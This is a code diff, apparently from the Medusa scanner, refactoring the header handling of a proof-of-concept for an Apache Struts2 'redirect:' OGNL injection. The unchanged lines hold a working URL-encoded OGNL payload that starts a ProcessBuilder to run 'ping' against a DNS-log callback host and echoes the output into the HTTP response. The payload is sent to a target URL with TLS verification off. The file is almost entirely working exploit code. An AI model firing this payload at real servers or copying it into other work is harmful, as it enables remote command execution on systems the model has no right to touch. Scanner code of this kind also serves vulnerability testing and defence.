@@ -31,7 +31,7 @@ class UrlProcessing:  # URL处理函数
             res = urllib.parse.urlparse('http://%s' % url)
         return res.scheme, res.hostname, res.port,res.path
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
 
     scheme, url, port,path = UrlProcessing().result(Url)
@@ -46,14 +46,9 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     payload="""?redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27ping%27%2c%27{}%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D""".format(DL.dns_host())
     try:
         payload_url = scheme + "://" + url +":"+ str(port)+path+payload
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
 
         try:#防止在linux系统上执行了POC，导致超时扫描不到漏洞
-            resp = requests.get(payload_url,headers=headers, timeout=6,proxies=proxies, verify=False)
+            resp = requests.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
             con = resp.text
         except:
             pass
